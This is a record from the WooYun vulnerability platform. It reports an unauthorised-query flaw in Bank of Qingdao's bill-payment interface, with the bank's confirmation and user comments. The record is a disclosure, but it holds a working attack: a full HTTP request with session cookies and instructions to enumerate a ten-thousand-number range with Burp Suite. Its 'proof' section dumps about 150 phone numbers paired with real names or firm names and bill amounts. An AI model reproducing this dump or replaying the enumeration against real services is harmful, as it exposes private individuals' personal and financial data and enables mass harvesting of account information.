{"id": 86524, "wybug_id": "wooyun-2016-0183324", "wybug_title": "青岛银行缴费接口未授权查询", "wybug_corp": "青岛银行", "wybug_author": "路人甲", "wybug_date": "2016-03-11 13:50", "wybug_open_date": "2016-04-28 13:07", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["银行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向公众公开  简要描述： 青岛银行缴费接口未授权查询，网址 https://inetpublic.qdccb.com/perbank/ 详细说明：  缴费通业务 \n\n找联通业务测试，1320532**** 通过****遍历 青岛地区联通手机号，可查所有青岛或济南等地手机号姓名和话费信息等。   漏洞证明：  \n\nPayload\t\"bilOwe\":\"\t\"userName\":\"13205320531\t985\t叶琳13205320451\t9673\t夏艳芳13205320609\t962\t薛涛13205320008\t9610\t李筱瑜13205320214\t9020\t王正旭13205320568\t86\t王善选13205320671\t850\t单颖13205320700\t8490\t胡彦明13205320437\t8402\t葛长安13205320692\t835\t于慎通13205320552\t8328\t邢方考13205320625\t8224\t袁丽娜13205320660\t812\t任素文13205320051\t7975\t邵昆13205320367\t7937\t杨乃宣13205320539\t790\t郑琦13205320180\t7791\t孙书友13205320689\t770\t庄明杰13205320173\t756\t宿学山13205320673\t756\t宿学山13205320160\t7523\t殷世月13205320127\t7265\t付伟13205320463\t7166\t吕春玉\t7137\t卜永辉13205320701\t6911\t王悦强13205320224\t662\t宋金坤13205320195\t63965\t青岛多美林食品厂13205320366\t6374\t任坤山13205320606\t633\t于泳13205320288\t6246\t祝源13205320053\t619\t乔钊华13205320307\t6170\t高维玲13205320056\t6092\t王华军13205320009\t5998\t青岛东方万象文化传媒有限公司13205320665\t5804\t姜宝来13205320695\t5620\t张猛猛13205320555\t5524\t李光兴13205320488\t5434\t黄刚13205320371\t5174\t罗鉴13205320045\t487\t李密13205320208\t4659\t杨金科13205320478\t4554\t王丙友13205320427\t4426\t刘乃贵13205320707\t4392\t薛晗13205320688\t4370\t顾晓13205320128\t4361\t王有国13205320287\t4150\t刘云贵13205320365\t41314\t牟洪礼13205320535\t4045\t王进福13205320577\t4003\t王云亭13205320663\t3593\t孙洋13205320392\t3431\t蔺增良13205320050\t3423\t许炳桥13205320582\t3335\t杜吉苏13205320517\t3268\t鉴萍13205320348\t32144\t赵清13205320352\t3183\t卢绍敏13205320161\t308\t贾丽花13205320523\t3034\t汤淼13205320120\t3027\t温鲁杰13205320255\t2918\t刘涛13205320133\t2884\t吴颖13205320538\t2823\t秦长生13205320026\t2806\t姜平吉13205320046\t2760\t王淑梅13205320616\t271\t王翔13205320384\t2447\t陈璐璐13205320511\t234\t宫国臣13205320497\t2320\t仲贤维13205320122\t23\t陈宝俊13205320390\t2295\t牛莎莎13205320278\t229\t何开利13205320092\t22426\t姜丰13205320398\t2203\t石玉洲13205320489\t2191\t陈万敏13205320309\t2174\t于媛13205320083\t2155\t王青13205320559\t2141\t李建龙13205320190\t2133\t徐京13205320474\t2131\t李长庚13205320597\t2098\t胡君平13205320108\t20847\t郭海鹏13205320594\t2040\t窦雪芹13205320635\t20359\t冯明虎13205320613\t20\t刘晓晨13205320251\t1948\t代清华13205320166\t192\t法磊13205320013\t1906\t李希勇13205320100\t1901\t雷康13205320589\t18900\t王天宝13205320585\t1863\t姜思尧13205320601\t18393\t杨硕13205320076\t1835\t姜志婷13205320279\t1777\t郭学初13205320135\t16992\t于伟民13205320266\t1646\t王立一13205320085\t16277\t袁英海13205320565\t162\t姜绍明13205320072\t16116\t吴大聪13205320016\t1600\t姜永杰13205320038\t15902\t徐龙13205320491\t14926\t候方平13205320302\t14512\t王苹苹13205320637\t1448\t贺林亮13205320571\t1448\t于建明13205320558\t14249\t隋东升13205320486\t1387\t于伟13205320325\t13690\t杨凯胜13205320699\t13504\t葛宝明13205320622\t1350\t陈莲芹13205320408\t1343\t崔东奎13205320440\t1294\t荆盛国13205320057\t1243\t刘宗利13205320389\t12341\t赵良福13205320450\t12290\t李世安13205320044\t1219\t柯良13205320283\t12\t莱西市金子通讯13205320196\t11388\t杨杰13205320530\t1131\t张宝骏13205320167\t11173\t许明伟13205320607\t11173\t许明伟13205320632\t1113\t龙水好13205320305\t10799\t李林辉13205320178\t10748\t王洪玉13205320233\t10481\t韩兴富13205320466\t1034\t付有臻13205320187\t1015\t刘敏13205320444\t1012\t李良\nPOST /perbank/030201_debtFeeQuery.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestX-Prototype-Version: 1.7Accept: text/javascript, text/html, application/xml, text/xml, */*Referer: https://inetpublic.qdccb.com/perbank/html/pay/030101_lifeFee.htmAccept-Language: zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: inetpublic.qdccb.comContent-Length: 305DNT: 1Connection: closeCache-Control: no-cacheCookie: __utma=197624943.1062203898.1457671633.1457671633.1457671633.1; __utmb=197624943.1.10.1457671633; __utmz=197624943.1457671633.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmc=197624943; JSESSIONID=p2y8WvPQvT3mqDC2LPfQM3lVCqhTfMQC0h2MZJs6Gnfvk5pgvdQ0!554186034trxCode=030101&srcChannel=PB&EMP_SID=EJIUCKGOCGFPACELAQCQBKDOELBTDYHPFMGGDQBJ&windowId=lui_window_365f8467-f756-fd1e-befe-5b24e3da2d05&programeValue=3&programeText=%E9%80%9A%E8%AE%AF%E8%B4%B9&feeReceiverValue=P010010001&userNoTypeValue=2&areaNo=0532&userNo=13205320414&midProductCode=P010010001&userFlag=2用burpsuite设置userNo为变量，从13205320000遍历到13205329999导出用户信息，只看了姓名和余额，手机号，没具体分析其他字段的意义。\n   修复方案：  限制用户查询权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-03-14 13:07 厂商回复： 十分感谢白帽子和乌云漏洞平台发现我行系统漏洞并及时通知，减少了此漏洞给公众带来的危害。我行已对该漏洞进行了及时的处理，已完成修补并通过第三方安全测评。后续我行将持续关注贵平台，并加强系统自身安全建设。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-11 13:58 |    \t\t√  ★云飞☆ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | #############################)\t\t \n  test    \n     2016-03-11 14:28 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1822 漏洞数:248        | 3P is the life I want to live.)\t\t \n  炸~    \n     2016-03-14 13:10 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:83        | 看似山穷水尽，终将柳暗花明)\t\t \n  帮我查查我还剩几个亿    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}